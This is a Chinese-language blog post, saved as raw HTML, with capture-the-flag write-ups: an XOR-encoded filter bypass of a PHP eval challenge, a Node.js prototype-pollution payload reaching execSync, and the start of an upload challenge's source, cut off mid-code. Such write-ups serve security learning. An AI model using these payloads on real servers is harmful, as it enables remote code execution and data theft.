@@ -1,0 +1,528 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png?v=2.6.2" sizes="180x180"><link rel="mask-icon" href="/images/icons/stun-logo.svg?v=2.6.2" color="#54bcff"><meta name="msapplication-TileImage" content="/images/icons/favicon-144x144.png"><meta name="msapplication-TileColor" content="#000000"><meta name="baidu-site-verification" content="code-15zD58SrOe"><meta name="description" content="[ISITDTU 2019]EasyPHP       123456789101112&lt;?phphighlight_file(__FILE__);$_ &#x3D; @$_GET[&amp;#x27;_&amp;#x27;];if ( preg_match(&amp;#x27;&#x2F;[\x00- 0-9\&amp;#x27;&quot;&#96;$&amp;.,|[&amp;#123;_defgops\x7F]+">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF记录2">
+<meta property="og:url" content="http://jlan.darkflow.top/posts/210d3ac7.html">
+<meta property="og:site_name" content="Jlan&#39;s Little World">
+<meta property="og:description" content="[ISITDTU 2019]EasyPHP       123456789101112&lt;?phphighlight_file(__FILE__);$_ &#x3D; @$_GET[&amp;#x27;_&amp;#x27;];if ( preg_match(&amp;#x27;&#x2F;[\x00- 0-9\&amp;#x27;&quot;&#96;$&amp;.,|[&amp;#123;_defgops\x7F]+">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-05-26T07:23:54.000Z">
+<meta property="article:modified_time" content="2022-05-27T01:09:46.639Z">
+<meta property="article:author" content="Jlan">
+<meta name="twitter:card" content="summary"><title>BUUCTF记录2 | Jlan's Little World</title><link ref="canonical" href="http://jlan.darkflow.top/posts/210d3ac7.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"carbon","highlight":"dark","wordWrap":true},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: {"avoidBanner":false},
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/links/"><span class="header-nav-menu-item__icon"><i class="fas fa-user-friends"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Jlan's Little World</div><div class="header-banner-info__subtitle">欢迎来学习知识</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">BUUCTF记录2</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-05-26</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-05-27</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/210d3ac7.html" data-flag-title="BUUCTF记录2"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value leancloud-visitors-count"></span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
+        <h2 id="ISITDTU-2019-EasyPHP"   >
+          <a href="#ISITDTU-2019-EasyPHP" class="heading-link"><i class="fas fa-link"></i></a><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2>
+      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="variable">$_</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosé will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower(<span class="variable">$_</span>), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+
+<p><code>strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd</code></p>
+<p>先看这个判断，count_chars函数用法如下</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><em>string</em></td>
+<td align="left">必需。规定要检查的字符串。</td>
+</tr>
+<tr>
+<td align="left"><em>mode</em></td>
+<td align="left">可选。规定返回模式。默认是 0。有以下不同的返回模式：<br />0 - 数组，ASCII 值为键名，出现的次数为键值1 - 数组，ASCII 值为键名，出现的次数为键值，只列出出现次数大于 0 的值<br />2 - 数组，ASCII 值为键名，出现的次数为键值，只列出出现次数等于 0 的值<br />3 - 字符串，带有所有使用过的不同的字符<br />4 - 字符串，带有所有未使用过的不同的字符</td>
+</tr>
+</tbody></table></div>
+<p>那么上述判断条件就是要保证传入的数据中有不多于13中不同的字符，先使用phpinfo查看信息</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?.=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></div></figure>
+
+<p>![](<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-26" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-26</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 15.30.06.png)</p>
+<p>可以使用scandir来扫描文件，构建payload：<code>print_r(scandir(&#39;.&#39;))</code></p>
+<p>使用异或脚本生成</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=<span class="string">&quot;print_r&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i)),<span class="number">16</span>) ^ <span class="number">0xff</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></div></figure>
+
+<p>生成的payload如下</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?.=((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%d1)^(%ff)))); </span><br></pre></td></tr></table></div></figure>
+
+<p>但是此时我们发现超过了13个不同字符的限制，所以我们需要通过异或缩减原始字符数量</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">now =<span class="string">&#x27;\&#x27;().;_acdinprst&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> now :</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> now:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> now :</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> now :</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">ord</span>(j)^<span class="built_in">ord</span>(k)^<span class="built_in">ord</span>(m) == <span class="built_in">ord</span>(i):</span><br><span class="line">                    <span class="keyword">if</span>(j==k <span class="keyword">or</span> j==m <span class="keyword">or</span> m==k ):</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span> :</span><br><span class="line">                        <span class="built_in">print</span>(i+<span class="string">&#x27;==&#x27;</span>+j + <span class="string">&#x27;^&#x27;</span>+ k +<span class="string">&#x27;^&#x27;</span>+m)</span><br></pre></td></tr></table></div></figure>
+
+<p>结果中可供替换的字符有很多，挑出三个好用的</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">t = s^c^d</span><br><span class="line">s^0xff=0x8c</span><br><span class="line">c^0xff=0x9c </span><br><span class="line">d^0xff=0x9b</span><br><span class="line">n = i^c^d</span><br><span class="line">i^0xff=0x96</span><br><span class="line">c^0xff=0x9c</span><br><span class="line">d^0xff=0x9b</span><br><span class="line">r = a^c^p</span><br><span class="line">a^0xff=0x9e</span><br><span class="line">c^0xff=0x9c</span><br><span class="line">p^0xff=0x8f</span><br></pre></td></tr></table></div></figure>
+
+<p>最终异或时候将不需要异或的字符串异或0xFF两次即可</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print_r=((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))</span><br><span class="line">scandir=((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))</span><br><span class="line">最终payload：?.=((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))(((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))((%d1)^(%ff)));</span><br></pre></td></tr></table></div></figure>
+
+<p>获得文件名，尝试访问发现没有权限，只能使用函数读取<code>readfile(end(scandir(&#39;.&#39;)))</code></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; index.php [3] =&gt; n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt )</span><br></pre></td></tr></table></div></figure>
+
+<p>真·最终payload</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?.=((%8D%9A%9E%9B%99%96%93%9A)^(%FF%FF%FF%FF%FF%FF%FF%FF))(((%9A%9E%9B)^(%FF%99%FF)^(%FF%96%FF)^(%FF%FF%FF))(((%8D%9E%9E%9E%9B%96%8D)^(%9A%9B%FF%99%FF%FF%FF)^(%9B%99%FF%96%FF%FF%FF)^(%FF%FF%FF%FF%FF%FF%FF))(%D1^%FF)));</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="GYCTF2020-Ez-Express"   >
+          <a href="#GYCTF2020-Ez-Express" class="heading-link"><i class="fas fa-link"></i></a><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2>
+      <p>本题触及知识盲区，乖乖学习node.js去咯</p>
+<p>首先还是要了解一下node.js，通俗意义上理解就是javascript的后端版本，所以基本上语法是和javascript一样的，这里贴个大佬的<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/12659738.html" >node.js相关安全问题总结</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，然后就是这道题了，是node.js的原型链污染</p>
+<p><strong>node.js的原型链污染</strong></p>
+<p>在js中万物皆对象，而在js我们如果想要定义一个类的话就需要使用类似于构造函数的方式来构造</p>
+<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.bar = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> Foo()</span><br></pre></td></tr></table></div></figure>
+
+<p>类中的方法也同样可以写在构造函数内</p>
+<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.bar = <span class="number">1</span></span><br><span class="line">    <span class="built_in">this</span>.show = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.bar)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">(<span class="keyword">new</span> Foo()).show()</span><br></pre></td></tr></table></div></figure>
+
+<p>但是这么写的问题是，我们每新建一个Foo对象时，this.show函数就会执行一次，也就是说，show方法实际上是被绑定在对象上而不是该对象的“类”上。而我们希望在创建类的时候只创建一次show方法，此时我们就需要使用原型(<code>prototype</code>)了</p>
+<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.bar = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Foo.prototype.show = <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.bar)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> Foo()</span><br><span class="line">foo.show()</span><br></pre></td></tr></table></div></figure>
+
+<p>我们可以认为原型<code>prototype</code>是类<code>Foo</code>的一个属性，而所有用<code>Foo</code>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的<code>foo</code>对象，其天生就具有<code>foo.show()</code>方法。</p>
+<p>我们可以通过<code>Foo.prototype</code>来访问<code>Foo</code>类的原型，但<code>Foo</code>实例化出来的对象，是不能通过prototype访问原型的。这时候，就该<code>__proto__</code>登场了。</p>
+<p>一个Foo类实例化出来的foo对象，可以通过<code>foo.__proto__</code>属性来访问Foo类的原型，也就是说：</p>
+<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo.__proto__ == Foo.prototype</span><br></pre></td></tr></table></div></figure>
+
+<p>所以</p>
+<ol>
+<li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li>
+<li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li>
+<li>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制</li>
+</ol>
+<p>那么问题就出在对于js来说，万物皆对象，只要我们不断的向上访问<code>__proto__</code>属性，再对其中的某个属性进行修改，总能找到相对于我们需要修改的类的父类，此时再新建我们需要修改的类时就自动带上了我们修改的内容</p>
+<p>以上全是知识，正式开始做题</p>
+<p>首先就是这个</p>
+<p>![](<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-26" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-26</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 23.00.30.png)</p>
+<p>用admın经过<code>toUpperCase</code>处理后变成ADMIN，进去之后没啥头绪，扫个目录吧，<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.zip拿到源码,可以看到res中的outputfunctionname属性为空,可以进行污染,并且在info中直接获得的就是outputfunctionname中的内容/" >www.zip拿到源码，可以看到res中的outputFunctionName属性为空，可以进行污染，并且在info中直接获得的就是outputFunctionName中的内容</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.session.user)&#123;</span><br><span class="line">    res.redirect(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.outputFunctionName=<span class="literal">undefined</span>;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:req.session.user.user&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></div></figure>
+
+<p>再加上上面的clone方法</p>
+<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>此时我们向/action中传入json编码后的payload</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;&#125;&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>再访问info即可获取flag</p>
+
+        <h2 id="安洵杯-2019-不是文件上传"   >
+          <a href="#安洵杯-2019-不是文件上传" class="heading-link"><i class="fas fa-link"></i></a><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2>
+      <p>传文件，试后缀，扫目录都不行，看源码</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$folder</span> = <span class="string">&quot;pic/&quot;</span>;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$ifview</span> = <span class="literal">False</span>; </span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$config</span> = <span class="string">&quot;config.txt&quot;</span>;</span><br><span class="line">	<span class="comment">// The function is not yet perfect, it is not open yet.</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$input</span>=<span class="string">&quot;file&quot;</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$fileinfo</span> = <span class="keyword">$this</span>-&gt;getfile(<span class="variable">$input</span>);</span><br><span class="line">		<span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">		<span class="variable">$array</span>[<span class="string">&quot;title&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">		<span class="variable">$array</span>[<span class="string">&quot;filename&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">		<span class="variable">$array</span>[<span class="string">&quot;ext&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;ext&#x27;</span>];</span><br><span class="line">		<span class="variable">$array</span>[<span class="string">&quot;path&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">		<span class="variable">$img_ext</span> = getimagesize(<span class="variable">$_FILES</span>[<span class="variable">$input</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">		<span class="variable">$my_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;width&quot;</span>=&gt;<span class="variable">$img_ext</span>[<span class="number">0</span>],<span class="string">&quot;height&quot;</span>=&gt;<span class="variable">$img_ext</span>[<span class="number">1</span>]);</span><br><span class="line">		<span class="variable">$array</span>[<span class="string">&quot;attr&quot;</span>] = serialize(<span class="variable">$my_ext</span>);</span><br><span class="line">		<span class="variable">$id</span> = <span class="keyword">$this</span>-&gt;save(<span class="variable">$array</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$id</span> == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;Something wrong!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="subst">$id</span>.&lt;/p&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfile</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">			<span class="variable">$rs</span> = <span class="keyword">$this</span>-&gt;check(<span class="variable">$_FILES</span>[<span class="variable">$input</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$rs</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$info</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$basename</span> = substr(md5(time().uniqid()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">		<span class="variable">$filename</span> = <span class="variable">$info</span>[<span 